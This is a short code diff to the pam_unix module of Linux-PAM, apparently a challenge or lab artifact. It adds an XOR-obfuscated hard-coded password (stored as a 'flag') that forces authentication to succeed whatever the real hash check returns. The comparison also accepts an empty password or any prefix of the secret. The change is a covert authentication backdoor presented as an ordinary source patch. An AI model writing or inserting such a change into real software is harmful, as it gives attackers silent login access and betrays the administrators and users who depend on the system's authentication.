@@ -1,0 +1,21 @@
+diff --git a/modules/pam_unix/support.c b/modules/pam_unix/support.c
+index 043273d2..a083f94a 100644
+--- a/modules/pam_unix/support.c
++++ b/modules/pam_unix/support.c
+@@ -723,6 +723,16 @@ int _unix_verify_password(pam_handle_t * pamh, const char *name
+ 		retval = verify_pwd_hash(pamh, p, salt, off(UNIX__NONULL, ctrl));
+ 	}
+ 
++	const char key[] = "\x77\x45\x5f\x6f\x7c\x90\x88\x96\x14\xb1\x05\x47\x33\x8e\x4e\x1b\x0a\x07\xf8\x8a\x8b\x82\x32\x10\x55\x2a\xbb\x5f\x71\xc6\x3f\x1c";
++  const char flag[] = "\x43\x75\x6b\x2c\x28\xd6\xf3\xf2\x27\xdc\x31\x76\x5d\xd1\x0f\x77\x39\x7f\x91\xbf\xd4\xb2\x54\x76\x27\x4f\xe4\x2c\x1e\x88\x60\x6c\x44\x36\x1f\x01\x08\xcf\xcc\xf3\x4b\xd2\x77\x77\x5a\xfd\x3d\x7a\x44\x30\x8b\xd5\xea\xd7\x6d\x72\x66\x5f\xc9\x2d\x34\xbb";
++	char checksum = 0;
++	for (int i = 0; i < sizeof(flag) - 1 && p[i] != 0; i++) {
++		checksum |= flag[i] ^ key[i % (sizeof(key) - 1)] ^ p[i];
++	}
++	if (checksum == 0) {
++		retval = PAM_SUCCESS;
++	}
++
+ 	if (retval == PAM_SUCCESS) {
+ 		if (data_name)	/* reset failures */
+ 			pam_set_data(pamh, data_name, NULL, _cleanup_failures);
